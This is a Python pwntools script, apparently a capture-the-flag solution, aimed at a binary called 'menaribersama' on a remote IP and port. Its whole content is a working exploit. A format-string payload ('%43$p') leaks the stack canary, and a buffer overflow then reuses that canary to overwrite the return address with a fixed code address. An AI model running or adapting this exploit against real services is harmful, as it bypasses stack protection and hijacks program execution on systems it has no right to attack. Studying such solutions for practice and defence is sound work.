#!/usr/bin/python3

from pwn import *
from binascii import unhexlify

elf = ELF('./menaribersama')

io = remote("167.71.207.218", 50600)
#io = elf.process()

io.clean()

payload = b''
payload += b'%43$p'

io.sendline(payload)
canary = p64(int(io.recvline(False)[2:], 16))

payload = b'A' * 296
payload += canary
payload += b'A' * 8
payload += p64(0x400947)

io.clean()

io.sendline(payload)

print(io.recv())

log.info(io.clean())


